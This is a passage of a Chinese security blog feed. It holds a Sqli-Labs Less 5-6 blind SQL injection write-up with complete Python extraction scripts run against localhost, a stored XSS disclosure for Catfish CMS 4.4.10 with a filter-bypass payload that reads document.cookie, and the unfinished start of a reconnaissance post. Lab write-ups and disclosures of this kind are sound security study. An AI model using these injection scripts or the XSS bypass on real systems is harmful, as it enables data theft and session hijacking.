      &lt;p&gt;Sqli-Labs是用来练习sql注入的好平台。project地址：&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;br&gt;本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53&lt;/p&gt;
&lt;p&gt;Less7 是 dump out file&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="sqlilab" scheme="http://yoursite.com/tags/sqlilab/"/>
    
  </entry>
  
  <entry>
    <title>Sqli-Labs:Less5-6-writeup</title>
    <link href="http://yoursite.com/2017/07/12/Sqli-Labs-Less5-6-writeup/"/>
    <id>http://yoursite.com/2017/07/12/Sqli-Labs-Less5-6-writeup/</id>
    <published>2017-07-12T00:38:41.000Z</published>
    <updated>2017-07-12T00:43:16.474Z</updated>
    
    <content type="html"><![CDATA[<p>Sqli-Labs是用来练习sql注入的好平台。project地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53</p>
<p>Less5-6是盲注<br><a id="more"></a></p>
<h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less 5"></a>Less 5</h1><h2 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h2><p>访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-5/?id=1</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170402/sqlilabless5/pic2.jpg" alt=""><br>页面正常，返回：You are in……</p>
<h2 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-5/?id=1&apos;</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170402/sqlilabless5/pic3.jpg" alt=""><br>报错。之后的过程要记得闭合单引号。</p>
<h2 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h2><p>依次访问如下链接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-5/?id=1&apos; AND 1=1 --+</div><div class="line">http://localhost:20000/sqllab/Less-5/?id=1&apos; AND 1=2 --+</div></pre></td></tr></table></figure></p>
<p>页面返回信息不同。同时试着使用UNION SELECT注入，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-5/?id=&apos; UNION SELECT 1,2,3 --+</div></pre></td></tr></table></figure></p>
<p>页面返回 You are in……返回通用页面。故考虑盲注。这里使用推断攻击技术，通过推断一次一位地逐步提取信息。注入 id=1’ AND (condition)后，通过页面返回的信息来判断condition的真假。当condition为真时，会返回包含“You are in……”的正常页面，当condition为假时，返回空页面。</p>
<h3 id="Exp1"><a href="#Exp1" class="headerlink" title="Exp1"></a>Exp1</h3><h4 id="Condition"><a href="#Condition" class="headerlink" title="Condition"></a>Condition</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Condition Example:</div><div class="line">SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT num1-1,1),num2,1) = char</div></pre></td></tr></table></figure>
<ul>
<li>num1和num2都是整数，char为单个字符。</li>
<li>(SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT num1-1,1)  会返回查询到结果（即各数据库名称）的第num1行。</li>
<li>SUBSTRING(*,num2,1)  返回查询后结果的第num2个字母。</li>
<li>SUBSTRING(*,num2,1) = a 是布尔表达式，根据其真假，页面会返回不同的信息。</li>
</ul>
<h4 id="Something"><a href="#Something" class="headerlink" title="Something"></a>Something</h4><ul>
<li>通过类似的方法，可以先获取数据库的数量，再根据数量依次判断。</li>
<li>通过变化num1，num2，char，可以获取到最后的数据。</li>
<li>多查询一位，通过返回的最后一位是否为空格来判断当前所查询字符串是否已经结束。</li>
</ul>
<h4 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line">dataset = <span class="string">" abcdefghijklmnopqrstuvwxyz_"</span></div><div class="line"></div><div class="line">querydata = <span class="string">"schema_name"</span></div><div class="line">querydb = <span class="string">"INFORMATION_SCHEMA"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendPayload</span><span class="params">(payload)</span>:</span></div><div class="line">	url = <span class="string">"http://localhost:20000/sqllab/Less-5/?id=1' "</span>+ payload</div><div class="line">	content = requests.get(url).text</div><div class="line">	<span class="keyword">return</span> content</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">findDatabaseNumber</span><span class="params">()</span>:</span></div><div class="line">	count = <span class="number">1</span></div><div class="line">	<span class="keyword">while</span> count:</div><div class="line">		payload = <span class="string">"AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) ="</span></div><div class="line">		payload = payload + str(count) + <span class="string">"--+"</span></div><div class="line">		recv = sendPayload(payload)</div><div class="line">		<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</div><div class="line">			<span class="keyword">return</span> count</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			count += <span class="number">1</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDatabaseName</span><span class="params">(dbNum)</span>:</span></div><div class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> range(dbNum):</div><div class="line">		i = <span class="number">1</span></div><div class="line">		result = <span class="string">""</span></div><div class="line">		<span class="keyword">while</span> i :</div><div class="line">			<span class="keyword">for</span> j <span class="keyword">in</span> dataset:</div><div class="line">				querysql = <span class="string">"AND SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT "</span>+str(k)+<span class="string">",1),"</span>+str(i)+<span class="string">",1)='"</span>+j</div><div class="line">				recv = sendPayload(querysql)  </div><div class="line">				<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</div><div class="line">					<span class="keyword">if</span> j != <span class="string">' '</span>:</div><div class="line">						result += j</div><div class="line">						i += <span class="number">1</span></div><div class="line">					<span class="keyword">else</span>:</div><div class="line">						<span class="keyword">print</span> result</div><div class="line">						i = <span class="number">0</span></div><div class="line">  					<span class="keyword">break</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></div><div class="line">	dbNum = findDatabaseNumber()</div><div class="line"> 	<span class="keyword">print</span> <span class="string">"the number of database is "</span>+str(dbNum)</div><div class="line"> 	getDatabaseName(dbNum)</div><div class="line"></div><div class="line">exp()</div></pre></td></tr></table></figure>
<h4 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h4><p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170402/sqlilabless5/pic4.jpg" alt=""></p>
<h3 id="Exp2"><a href="#Exp2" class="headerlink" title="Exp2"></a>Exp2</h3><p>Exp1中，是基于字典进行匹配的，效率低下。可以采用二分法来进行优化。大体思路如上跟Exp1相同。</p>
<h4 id="Condition-1"><a href="#Condition-1" class="headerlink" title="Condition"></a>Condition</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Condition Example:</div><div class="line">ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT  0 ,1), 1 ,1)) &gt; 127</div></pre></td></tr></table></figure>
<p>判断当前第一行的第一个字符的asll码值是否大于127。若该条件为真，则将127替换为 191 （即 （127+255）/2），若该条件为假，则将127替换为63（即（-1+127）/2）</p>
<h4 id="Something-1"><a href="#Something-1" class="headerlink" title="Something"></a>Something</h4><p>在写二分法盲注时遇到了一些问题，想了一些策略，但不知道是不是最好的。如果有更好的做法，希望留言告知</p>
<ul>
<li>搜索范围选择（-1，255），这样能包括的字符ASCII值x满足：0≤x≤255。当判断到所查询字符串结尾时，此时mysql对应的不是空格ASCII码32，而是0。假设所查询的第一个字符串长度为10，当查询到字符串尾部后（即第11个字符），下面这条语句是恒假的：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT  0 ,1), 11 ,1)) &gt; 0</div><div class="line">+ 由于采用了递归二分法。这里用全局变量findBit用来判断当前字符串是否查询结束，若findBit为1，表明已经查完可以直接break跳到下一个查询。</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="Code-1"><a href="#Code-1" class="headerlink" title="Code"></a>Code</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">querydata = <span class="string">"schema_name"</span></div><div class="line">querydb = <span class="string">"INFORMATION_SCHEMA"</span></div><div class="line"><span class="keyword">global</span> findBit</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendPayload</span><span class="params">(payload)</span>:</span></div><div class="line">	url = <span class="string">"http://localhost:20000/sqllab/Less-5/?id=1' "</span>+ payload</div><div class="line">	content = requests.get(url).text</div><div class="line">	<span class="keyword">return</span> content</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">findDatabaseNumber</span><span class="params">()</span>:</span></div><div class="line">	count = <span class="number">1</span></div><div class="line">	<span class="keyword">while</span> count:</div><div class="line">		payload = <span class="string">"AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) ="</span></div><div class="line">		payload = payload + str(count) + <span class="string">"--+"</span></div><div class="line">		recv = sendPayload(payload)</div><div class="line">		<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</div><div class="line">			<span class="keyword">return</span> count</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			count += <span class="number">1</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDatabaseName</span><span class="params">(dbNum)</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> range(dbNum):</div><div class="line">		i = <span class="number">1</span></div><div class="line">		<span class="keyword">while</span> i :</div><div class="line">			findBit = <span class="number">0</span></div><div class="line">			doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,k)</div><div class="line">			i += <span class="number">1</span></div><div class="line">			<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">				sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">				<span class="keyword">break</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">doubleSearch</span><span class="params">(leftNum,rightNum,i,k)</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	midNum = (leftNum + rightNum) / <span class="number">2</span></div><div class="line">	<span class="keyword">if</span> (rightNum != leftNum +<span class="number">1</span>):</div><div class="line">		querysql = <span class="string">"AND ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT "</span> + str(k) + <span class="string">",1),"</span> + str(i) + <span class="string">",1)) &gt; "</span> + str(midNum) + <span class="string">"--+"</span></div><div class="line">		recv = sendPayload(querysql)</div><div class="line">		<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</div><div class="line">			doubleSearch(midNum,rightNum,i,k)</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			doubleSearch(leftNum,midNum,i,k)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">if</span> rightNum != <span class="number">0</span>:</div><div class="line">			sys.stdout.write(chr(rightNum))</div><div class="line">			sys.stdout.flush()</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			findBit = <span class="number">1</span></div><div class="line">			<span class="keyword">return</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></div><div class="line">	dbNum = findDatabaseNumber()</div><div class="line"> 	<span class="keyword">print</span> <span class="string">"the number of database is "</span>+str(dbNum)</div><div class="line"> 	getDatabaseName(dbNum)</div><div class="line"></div><div class="line">exp()</div></pre></td></tr></table></figure>
<h4 id="Result-1"><a href="#Result-1" class="headerlink" title="Result"></a>Result</h4><p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170402/sqlilabless5/pic5.jpg" alt=""></p>
<h1 id="Less-6"><a href="#Less-6" class="headerlink" title="Less 6"></a>Less 6</h1><h2 id="Step1"><a href="#Step1" class="headerlink" title="Step1"></a>Step1</h2><p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170403/sqlilabsless6/step1.jpg" alt=""></p>
<ul>
<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-6/?id=1&apos;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>无报错</p>
<ul>
<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-6/?id=1&quot;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>页面报错，返回信息： use near ‘“1”” LIMIT 0,1’ at line 1。需要闭合双引号。</p>
<ul>
<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-6/?id=1&quot; AND 1=1 --+</div></pre></td></tr></table></figure>
</li>
</ul>
<p>页面返回正常</p>
<ul>
<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-6/?id=1&quot; AND 1=2 --+</div></pre></td></tr></table></figure>
</li>
</ul>
<p>返回错误页面（空白）</p>
<h2 id="Step2"><a href="#Step2" class="headerlink" title="Step2"></a>Step2</h2><p>采用盲注。分析同Less5。exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">querydata = <span class="string">"schema_name"</span></div><div class="line">querydb = <span class="string">"INFORMATION_SCHEMA"</span></div><div class="line"><span class="keyword">global</span> findBit</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendPayload</span><span class="params">(payload)</span>:</span></div><div class="line">	url = <span class="string">'http://localhost:20000/sqllab/Less-6/?id=1" '</span>+ payload</div><div class="line">	content = requests.get(url).text</div><div class="line">	<span class="keyword">return</span> content</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">findDatabaseNumber</span><span class="params">()</span>:</span></div><div class="line">	count = <span class="number">1</span></div><div class="line">	<span class="keyword">while</span> count:</div><div class="line">		payload = <span class="string">"AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) ="</span></div><div class="line">		payload = payload + str(count) + <span class="string">"--+"</span></div><div class="line">		recv = sendPayload(payload)</div><div class="line">		<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</div><div class="line">			<span class="keyword">return</span> count</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			count += <span class="number">1</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDatabaseName</span><span class="params">(dbNum)</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> range(dbNum):</div><div class="line">		i = <span class="number">1</span></div><div class="line">		<span class="keyword">while</span> i :</div><div class="line">			findBit = <span class="number">0</span></div><div class="line">			doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,k)</div><div class="line">			i += <span class="number">1</span></div><div class="line">			<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">				sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">				<span class="keyword">break</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">doubleSearch</span><span class="params">(leftNum,rightNum,i,k)</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	midNum = (leftNum + rightNum) / <span class="number">2</span></div><div class="line">	<span class="keyword">if</span> (rightNum != leftNum +<span class="number">1</span>):</div><div class="line">		querysql = <span class="string">"AND ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT "</span> + str(k) + <span class="string">",1),"</span> + str(i) + <span class="string">",1)) &gt; "</span> + str(midNum) + <span class="string">"--+"</span></div><div class="line">		recv = sendPayload(querysql)</div><div class="line">		<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</div><div class="line">			doubleSearch(midNum,rightNum,i,k)</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			doubleSearch(leftNum,midNum,i,k)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">if</span> rightNum != <span class="number">0</span>:</div><div class="line">			sys.stdout.write(chr(rightNum))</div><div class="line">			sys.stdout.flush()</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			findBit = <span class="number">1</span></div><div class="line">			<span class="keyword">return</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></div><div class="line">	dbNum = findDatabaseNumber()</div><div class="line"> 	<span class="keyword">print</span> <span class="string">"the number of database is "</span>+str(dbNum)</div><div class="line"> 	getDatabaseName(dbNum)</div><div class="line"></div><div class="line">exp()</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Sqli-Labs是用来练习sql注入的好平台。project地址：&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;br&gt;本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53&lt;/p&gt;
&lt;p&gt;Less5-6是盲注&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="sqlilab" scheme="http://yoursite.com/tags/sqlilab/"/>
    
  </entry>
  
  <entry>
    <title>Catfish(鲶鱼) CMS V 4.4.10 留言板存储型XSS漏洞</title>
    <link href="http://yoursite.com/2017/07/11/Catfish-%E9%B2%B6%E9%B1%BC-CMS-V-4-4-10-%E7%95%99%E8%A8%80%E6%9D%BF%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2017/07/11/Catfish-鲶鱼-CMS-V-4-4-10-留言板存储型XSS漏洞/</id>
    <published>2017-07-11T11:34:56.000Z</published>
    <updated>2017-07-11T11:54:16.098Z</updated>
    
    <content type="html"><![CDATA[<p>Catfish(鲶鱼) CMS V 4.4.10 ：<a href="http://www.catfish-cms.com/" target="_blank" rel="external">http://www.catfish-cms.com/</a><br><a id="more"></a></p>
<h1 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h1><p>在<code>...\application\index\controller\Index.php</code>中，定义了评论功能。代码如下；<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//添加评论</span></div><div class="line">$data = [</div><div class="line">	<span class="string">'post_id'</span> =&gt; Request::instance()-&gt;post(<span class="string">'id'</span>),</div><div class="line">	<span class="string">'url'</span> =&gt; <span class="string">'index/Index/article/id/'</span>.Request::instance()-&gt;post(<span class="string">'id'</span>),</div><div class="line">	<span class="string">'uid'</span> =&gt; Session::get(<span class="keyword">$this</span>-&gt;session_prefix.<span class="string">'user_id'</span>),</div><div class="line">	<span class="string">'to_uid'</span> =&gt; $beipinglunren[<span class="string">'post_author'</span>],</div><div class="line">	<span class="string">'createtime'</span> =&gt; date(<span class="string">"Y-m-d H:i:s"</span>),</div><div class="line">	<span class="string">'content'</span> =&gt; <span class="keyword">$this</span>-&gt;filterJs(Request::instance()-&gt;post(<span class="string">'pinglun'</span>)),</div><div class="line">	<span class="string">'status'</span> =&gt; $plzt</div><div class="line">];</div><div class="line">Db::name(<span class="string">'comments'</span>)-&gt;insert($data);</div></pre></td></tr></table></figure></p>
<p>评论内容content在经过函数filterJs过滤后插入到数据库中。</p>
<p>filterJs定义在<code>...\application\index\controller\Common.php</code>中<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">filterJs</span><span class="params">($str)</span></span></div><div class="line">&#123;</div><div class="line">        <span class="keyword">return</span> preg_replace([<span class="string">'/&lt;script[\s\S]*?&lt;\/script&gt;/i'</span>,<span class="string">'/&lt;style[\s\S]*?&lt;\/style&gt;/i'</span>],<span class="string">''</span>,$str);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>仅做了简单的过滤，只要构造下列payload就可绕过:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;scr&lt;script&gt;&lt;/script&gt;ipt&gt;alert(document.cookie)&lt;/scr&lt;script&gt;&lt;/script&gt;ipt&gt;</div></pre></td></tr></table></figure></p>
<p>filterJs会把<code>&lt;script&gt;**&lt;/script&gt;替换为空</code>，从而使插入到数据库中的数据变为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;替换为空</div></pre></td></tr></table></figure></p>
<h1 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h1><p>以普通账户user登陆，并对文章进行评论</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170711/2.jpg?raw=true" alt=""></p>
<p>因为Catfish CMS在前端进行了一次编码过滤，若是直接在评论区直接插入payload会被编码转换。所i抓包，将pinglun参数改为payload</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170711/3.jpg?raw=true" alt=""></p>
<p>admin登陆后台，触发XSS：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170711/4.jpg?raw=true" alt=""></p>
<p>查看源代码：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170711/5.jpg?raw=true" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Catfish(鲶鱼) CMS V 4.4.10 ：&lt;a href=&quot;http://www.catfish-cms.com/&quot;&gt;http://www.catfish-cms.com/&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="漏洞分析" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="XSS" scheme="http://yoursite.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试(1)信息搜集</title>
    <link href="http://yoursite.com/2017/07/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-1-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <id>http://yoursite.com/2017/07/11/渗透测试-1-信息搜集/</id>
    <published>2017-07-11T01:20:07.000Z</published>
    <updated>2017-07-14T14:28:01.827Z</updated>
    
    <content type="html"><![CDATA[<p>未完<br><a id="more"></a></p>
<h1 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h1><h2 id="域名注册人等"><a href="#域名注册人等" class="headerlink" title="域名注册人等"></a>域名注册人等</h2><h3 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h3><p>利用whois，可以查询域名的相关详细信息。包括域名所有人，域名注册日期，联系方式，邮箱等等。在社会工程学、以及后期的渗透中起到很大的作用。</p>
<ul>
<li><a href="http://whois.chinaz.com/" target="_blank" rel="external">http://whois.chinaz.com/</a></li>
<li>l</li>
</ul>
